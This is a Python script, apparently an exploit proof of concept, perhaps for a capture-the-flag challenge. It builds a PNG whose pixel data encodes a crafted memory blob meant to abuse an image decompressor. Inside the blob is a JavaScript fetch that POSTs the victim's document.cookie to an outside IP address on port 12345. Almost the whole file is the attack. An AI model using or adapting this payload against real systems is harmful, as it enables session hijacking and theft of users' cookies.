from PIL import Image
import random
qwq = []
def num2color(n):
    ret = []
    while True:
        s = n // 256
        ret.append(n % 256)
        if s==0:
            break
        n = s
    ret.reverse()
    while len(ret) <3:
        ret = [0] + ret
    return tuple(ret)
for i in range(1 * 750000):
#u = (*num2color(i), 0xcc)
    u = (0,0,0,0xcc)
    qwq.append(u)
origin_mem = "\x42\x20\x04\x42\xEF\xBE\xAD\xDE\x8B\x59\x00\x00\x58\x0D\x50\x00"
origin_mem += "-+   0X0x\00-0X+0X 0X-0x+0x 0x\00!num_bits\00tinfl_decompress\00nan\00inf\00miniz.c\00NAN\00INF\00.\00II*\00fetch('http://104.238.150.210:12345', {mode: 'no-cors', method: 'POST', body: JSON.stringify(document.cookie)});\00(null"
print(len(origin_mem))
assert(len(origin_mem) % 4 == 0)
pic = Image.new("RGBA", (1, 750000+len(origin_mem)))
for i in range(len(origin_mem)//4):
    data = origin_mem[i*4:i*4+4]
    pixel = (
        255-ord(data[0]),
        255-ord(data[1]),
        255-ord(data[2]),
        ord(data[3])
    )
    qwq.append(pixel)
pic.putdata(qwq)
pic.save("./out.png", "PNG")